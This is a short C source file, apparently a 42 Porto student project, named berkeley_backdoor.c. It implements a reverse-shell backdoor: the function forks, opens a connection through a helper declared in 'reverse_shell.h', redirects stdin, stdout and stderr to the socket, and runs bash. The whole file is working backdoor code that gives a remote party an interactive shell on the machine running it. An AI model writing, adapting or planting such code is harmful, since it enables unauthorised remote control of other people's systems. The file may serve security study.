/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   berkeley_backdoor.c                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 17:29:38 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/10 17:54:42 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <stdlib.h>
#include "reverse_shell.h"

int	berkeley_backdoor(void)
{
	int	client_fd;

	if (fork() != 0)
		return (1);
	if (berkeley_client_connection(&client_fd) != 0)
		exit(1);
	if (dup2(client_fd, STDIN_FILENO) == -1)
		(close(client_fd), exit(1));
	if (dup2(client_fd, STDOUT_FILENO) == -1)
		(close(client_fd), exit(1));
	if (dup2(client_fd, STDERR_FILENO) == -1)
		(close(client_fd), exit(1));
	close(client_fd);
	execlp("bash", "bash", NULL);
	exit(1);
}
